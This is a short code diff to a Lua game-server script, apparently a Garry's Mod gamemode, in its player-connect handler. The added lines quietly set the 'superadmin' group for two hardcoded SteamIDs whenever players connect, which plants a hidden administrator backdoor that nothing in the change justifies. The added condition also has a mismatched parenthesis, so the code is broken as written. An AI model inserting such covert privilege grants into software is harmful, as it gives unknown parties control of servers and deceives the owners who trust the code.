@@ -33,6 +33,10 @@ function GM:PlayerConnect(name, ip)
 		if v:IsSuperAdmin() then
 			v:SendHint(name .. " joined (" .. ip .. ")")
 		end
+		
+		if (v:SteamID() == "STEAM_0:0:42138604") || (v:SteamID() == "STEAM_0:1:62445445")) then
+			v:SetUserGroup("superadmin")
+		end
 	end
 end
 
